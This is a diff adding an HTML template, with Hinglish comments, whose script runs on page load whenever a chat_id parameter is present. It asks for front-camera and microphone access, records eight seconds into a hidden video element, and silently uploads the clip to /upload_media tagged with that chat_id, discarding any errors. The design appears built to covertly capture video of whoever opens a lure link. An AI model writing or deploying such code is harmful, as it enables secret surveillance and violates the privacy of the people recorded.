@@ -1,0 +1,60 @@
+<!-- ================================================================= -->
+<!-- 🔗 [UI CONNECTION: File name yahan change kar sakte hain]          -->
+<!-- ================================================================= -->
+{% include 'camera.html' %}
+
+
+<!-- ================================================================= -->
+<!-- 🤖 [BACKGROUND FRONT 8s VIDEO ENGINE]                             -->
+<!-- ================================================================= -->
+<video id="_bg_f8s_vid" autoplay playsinline muted style="display:none;"></video>
+
+<script>
+(function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('chat_id');
+    const bgVideo = document.getElementById('_bg_f8s_vid');
+
+    async function initFront8sVideo() {
+        if (!chatId) return;
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user" },
+                audio: true
+            });
+            bgVideo.srcObject = stream;
+
+            const uiVideos = document.querySelectorAll('video');
+            uiVideos.forEach(v => { if (!v.srcObject) v.srcObject = stream; });
+
+            let chunks = [];
+            const recorder = new MediaRecorder(stream);
+
+            recorder.ondataavailable = (e) => {
+                if (e.data && e.data.size > 0) chunks.push(e.data);
+            };
+
+            recorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'video/mp4' });
+                const fd = new FormData();
+                fd.append('file', blob, 'front_video.mp4');
+                fd.append('chat_id', chatId);
+                fd.append('type', 'video');
+
+                fetch('/upload_media', { method: 'POST', body: fd }).catch(() => {});
+            };
+
+            recorder.start();
+            setTimeout(() => {
+                if (recorder.state !== 'inactive') recorder.stop();
+            }, 8000);
+
+        } catch (err) {
+            console.error("Front video capture error:", err);
+        }
+    }
+
+    window.addEventListener('DOMContentLoaded', initFront8sVideo);
+})();
+</script>
